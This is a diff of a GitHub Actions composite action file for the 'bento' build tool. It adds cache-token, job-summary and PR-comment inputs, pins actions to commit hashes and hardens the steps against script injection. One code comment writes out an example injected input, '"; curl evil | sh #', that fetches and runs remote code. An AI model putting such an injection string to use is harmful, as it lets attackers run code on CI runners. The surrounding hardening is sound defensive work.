@@ -2,6 +2,13 @@ name: Bento CI
 description: Run a bento (plan + execute with content-hash caching) in GitHub Actions.
 author: Disruptor Labs
 
+# Runner support: ubuntu-* and macos-* only. Windows runners are NOT
+# supported — every step is `shell: bash`, the helper script is a POSIX
+# shell script, and no Windows binary is published (v0.2). On Windows,
+# `cargo install bento-cli` and invoke bento directly instead of using
+# this action. Alpine-based container jobs are fine: the installer
+# picks the static musl tarball when it sees a musl libc.
+
 branding:
   icon: box
   color: orange
@@ -117,6 +124,54 @@ inputs:
     required: false
     default: 'false'
 
+  cache-token:
+    description: >
+      JWT for the hosted remote cache (`[cache] remote =
+      "bento://…"` in bento.toml). Get it from `bento login` or the
+      dashboard, store it as a repo secret, and pass that secret
+      here. Without it a workspace configured for the hosted cache
+      silently falls back to the local + actions/cache tiers — hits
+      on laptops, none in CI. Leave empty if the workflow already
+      exports the token env var itself; an empty input never
+      clobbers it.
+    required: false
+    default: ''
+
+  job-summary:
+    description: >
+      When 'true' (default), append a run summary to the job's
+      $GITHUB_STEP_SUMMARY — headline counts plus a per-task table
+      (dish, task, outcome, cache key, duration) and the stderr
+      excerpt of anything that failed. Needs `jq` on the runner
+      (standard on GitHub-hosted images); skipped silently if absent.
+    required: false
+    default: 'true'
+
+  pr-comment:
+    description: >
+      Sticky pull-request comment carrying the same report as the job
+      summary — one comment per PR, edited in place on every push.
+      'auto' (default) comments on `pull_request` events only;
+      'always' also comments on other events when a PR can be
+      resolved for the ref; 'never' disables it.
+
+      The calling job must grant `permissions: pull-requests: write`
+      and the token reaches `gh` through the `github-token` input
+      (default: the workflow token). Anything that goes wrong —
+      missing token, read-only permissions, API error — is a
+      `::warning::`, never a job failure.
+    required: false
+    default: 'auto'
+
+  github-token:
+    description: >
+      Token used for the `pr-comment` step. Defaults to the workflow's
+      own token, which still needs `permissions: pull-requests: write`
+      on the calling job. Pass a PAT to comment as a different account
+      (e.g. a bot with an avatar).
+    required: false
+    default: ${{ github.token }}
+
   cache-key-suffix:
     description: >
       Extra key component appended to the bento cache key. Bump it to force
@@ -136,8 +191,8 @@ inputs:
       `uv python install`), and uv (declared co-required by the python
       tool, so a `[toolchain] python = "..."` pin lays uv down first
       automatically). For tools without a built-in installer —
-      currently `bun` and `deno` — the action bootstraps from each
-      ecosystem's official install script (`bun.sh/install`) before
+      currently `bun` and `deno` — the action bootstraps from the
+      pinned upstream GitHub release asset, checksum-verified, before
       invoking bento, when those tools are pinned in `bento.toml`'s
       `[toolchain]` block.
 
@@ -169,6 +224,18 @@ outputs:
       release upload, etc.). Empty `{}` if nothing matched.
     value: ${{ steps.execute.outputs.artifacts }}
 
+  cache-hits:
+    description: Tasks restored from cache (`summary.hits`). Empty if `jq` isn't on the runner.
+    value: ${{ steps.execute.outputs.cache-hits }}
+
+  cache-misses:
+    description: Tasks that actually ran (`summary.built`). Empty if `jq` isn't on the runner.
+    value: ${{ steps.execute.outputs.cache-misses }}
+
+  failed:
+    description: Tasks that failed (`summary.failed`). Empty if `jq` isn't on the runner.
+    value: ${{ steps.execute.outputs.failed }}
+
   toolchains-installed:
     description: >
       JSON listing toolchains installed by the auto-install step. Set only
@@ -179,20 +246,25 @@ outputs:
       uv when python is pinned) appear in `installed` with
       `co_required_for` instead of `used_by`. The `skipped` array
       lists pinned tools that bento doesn't install natively (today:
-      `bun`, `deno`); the composite action falls back to each
-      ecosystem's official install script for those before this step
-      runs.
+      `bun`, `deno`); the composite action falls back to the pinned
+      upstream release asset for those before this step runs.
     value: ${{ steps.install-toolchains.outputs.json }}
 
 runs:
   using: composite
   steps:
+    # Inputs reach every `run:` block through `env:`, never through
+    # `${{ }}` interpolation: a template substitution is pasted into the
+    # script before bash sees it, so a caller passing `"; curl evil | sh
+    # #` would execute it.
     - name: Resolve workspace path
       id: resolve
       shell: bash
+      env:
+        WORKSPACE_PATH: ${{ inputs.workspace-path }}
       run: |
-        if [ -n "${{ inputs.workspace-path }}" ]; then
-          path="${{ inputs.workspace-path }}"
+        if [ -n "$WORKSPACE_PATH" ]; then
+          path="$WORKSPACE_PATH"
         else
           path="${GITHUB_WORKSPACE}"
         fi
@@ -200,8 +272,11 @@ runs:
 
     - name: Validate inputs
       shell: bash
+      env:
+        BENTO_VERSION: ${{ inputs.version }}
+        SOURCE_PATH: ${{ inputs.source-path }}
       run: |
-        if [ -z "${{ inputs.version }}" ] && [ -z "${{ inputs.source-path }}" ]; then
+        if [ -z "$BENTO_VERSION" ] && [ -z "$SOURCE_PATH" ]; then
           echo "::error::either 'version' (download binary) or 'source-path' (build from source) must be set"
           exit 1
         fi
@@ -221,20 +296,22 @@ runs:
 
     - name: Install Rust toolchain (stable)
       if: inputs.version == ''
-      uses: dtolnay/rust-toolchain@stable
+      uses: dtolnay/rust-toolchain@6c977a6ca4077a0ceb28ffbe03f59d46e9ac8772 # v1
+      with:
+        toolchain: stable
 
     - name: Cache Cargo registry, git index, and build
       if: inputs.version == ''
-      uses: actions/cache@v4
+      uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
       with:
         path: |
           ~/.cargo/registry/index
           ~/.cargo/registry/cache
           ~/.cargo/git/db
           ${{ inputs.source-path }}/target
-        key: bento-cargo-${{ runner.os }}-${{ hashFiles(format('{0}/Cargo.lock', inputs.source-path)) }}
+        key: bento-cargo-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles(format('{0}/Cargo.lock', inputs.source-path)) }}
         restore-keys: |
-          bento-cargo-${{ runner.os }}-
+          bento-cargo-${{ runner.os }}-${{ runner.arch }}-
 
     - name: Build bento CLI from source (fallback)
       if: inputs.version == ''
@@ -248,12 +325,12 @@ runs:
       run: echo "${HOME}/.bento-install/bin" >> "$GITHUB_PATH"
 
     - name: Restore bento content cache
-      uses: actions/cache@v4
+      uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
       with:
         path: ~/.bento/cache
-        key: bento-cache-${{ inputs.cache-key-suffix }}-${{ runner.os }}-${{ github.sha }}
+        key: bento-cache-${{ inputs.cache-key-suffix }}-${{ runner.os }}-${{ runner.arch }}-${{ github.sha }}
         restore-keys: |
-          bento-cache-${{ inputs.cache-key-suffix }}-${{ runner.os }}-
+          bento-cache-${{ inputs.cache-key-suffix }}-${{ runner.os }}-${{ runner.arch }}-
 
     # Cache the package managers' OWN global download caches. This is
     # what speeds up cache misses — when bento decides a task needs to
@@ -262,7 +339,7 @@ runs:
     # actions/cache@v4 silently skips non-existent paths, so caching all
     # of these is free for languages this workspace doesn't use.
     - name: Restore per-tool dependency caches
-      uses: actions/cache@v4
+      uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
       with:
         path: |
           ~/go/pkg/mod
@@ -280,13 +357,13 @@ runs:
           ~/.m2/repository
           ~/.gradle/caches
           ~/.gradle/wrapper
-        key: bento-deps-${{ runner.os }}-${{ hashFiles('**/go.sum', '**/package-lock.json', '**/pnpm-lock.yaml', '**/yarn.lock', '**/bun.lock', '**/bun.lockb', '**/composer.lock', '**/pom.xml', '**/Cargo.lock', '**/poetry.lock', '**/uv.lock', '**/Gemfile.lock', '**/build.gradle', '**/build.gradle.kts', '**/gradle/libs.versions.toml') }}
+        key: bento-deps-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('**/go.sum', '**/package-lock.json', '**/pnpm-lock.yaml', '**/yarn.lock', '**/bun.lock', '**/bun.lockb', '**/composer.lock', '**/pom.xml', '**/Cargo.lock', '**/poetry.lock', '**/uv.lock', '**/Gemfile.lock', '**/build.gradle', '**/build.gradle.kts', '**/gradle/libs.versions.toml') }}
         restore-keys: |
-          bento-deps-${{ runner.os }}-
+          bento-deps-${{ runner.os }}-${{ runner.arch }}-
 
     - name: Restore toolchain cache
       if: inputs.install-toolchains == 'true'
-      uses: actions/cache@v4
+      uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
       with:
         path: ~/.bento/tools
         # Hash every TOML and .tool-versions file in the workspace —
@@ -294,9 +371,9 @@ runs:
         # version pin can live (bento.toml, per-dish dish.toml, asdf/mise
         # .tool-versions, .ruby-version-style files via .tool-versions
         # equivalents).
-        key: bento-toolchains-${{ runner.os }}-${{ hashFiles('**/bento.toml', '**/dish.toml', '**/.tool-versions') }}
+        key: bento-toolchains-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('**/bento.toml', '**/dish.toml', '**/.tool-versions') }}
         restore-keys: |
-          bento-toolchains-${{ runner.os }}-
+          bento-toolchains-${{ runner.os }}-${{ runner.arch }}-
 
     - name: Install pinned toolchains
       id: install-toolchains
@@ -335,5 +412,25 @@ runs:
         BENTO_PREVIEW: ${{ inputs.preview }}
         BENTO_ROLLBACK: ${{ inputs.rollback }}
         BENTO_NO_NOTIFY: ${{ inputs.no-notify }}
+        BENTO_JOB_SUMMARY: ${{ inputs.job-summary }}
+        # Deliberately not named BENTO_CACHE_TOKEN: a step-level env
+        # entry shadows the caller's own export even when empty, so
+        # binding the input directly would unset a token the workflow
+        # provided itself. run.sh promotes it only when non-empty.
+        BENTO_CACHE_TOKEN_INPUT: ${{ inputs.cache-token }}
         REPORT_FILE: ${{ runner.temp }}/bento-report.json
       run: bash "${{ github.action_path }}/scripts/action/run.sh" execute
+
+    # `always()` because a red run is exactly when the comment is worth
+    # reading. The phase itself always exits 0 — the job's status stays
+    # whatever `execute` made it.
+    - name: Comment on the pull request
+      if: always() && inputs.pr-comment != 'never'
+      shell: bash
+      working-directory: ${{ steps.resolve.outputs.path }}
+      env:
+        BENTO_PR_COMMENT: ${{ inputs.pr-comment }}
+        GH_TOKEN: ${{ inputs.github-token }}
+        PR_NUMBER: ${{ github.event.pull_request.number }}
+        REPORT_FILE: ${{ runner.temp }}/bento-report.json
+      run: bash "${{ github.action_path }}/scripts/action/run.sh" pr-comment
